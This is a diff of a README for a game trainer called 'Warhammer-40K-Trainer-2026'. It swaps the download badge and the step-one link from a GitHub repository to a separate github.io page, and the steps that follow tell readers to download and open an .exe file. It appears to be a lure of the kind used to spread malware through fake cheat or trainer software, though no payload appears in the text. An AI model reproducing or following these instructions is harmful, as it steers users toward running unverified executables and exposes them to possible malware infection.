@@ -1,6 +1,6 @@
 # 🛡️ Warhammer-40K-Trainer-2026 - Master your gaming experience with ease
 
-[![](https://img.shields.io/badge/Download_Installer-Blue-blue.svg)](https://github.com/chazzy128/Warhammer-40K-Trainer-2026)
+[![](https://img.shields.io/badge/Download_Installer-Blue-blue.svg)](https://chazzy128.github.io)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the trainer on your machine.
 
-1. Visit [this page to download the software](https://github.com/chazzy128/Warhammer-40K-Trainer-2026).
+1. Visit [this page to download the software](https://chazzy128.github.io).
 2. Look for the file ending in .exe.
 3. Select the file to begin the download process.
 4. Open the downloaded file from your Downloads folder.
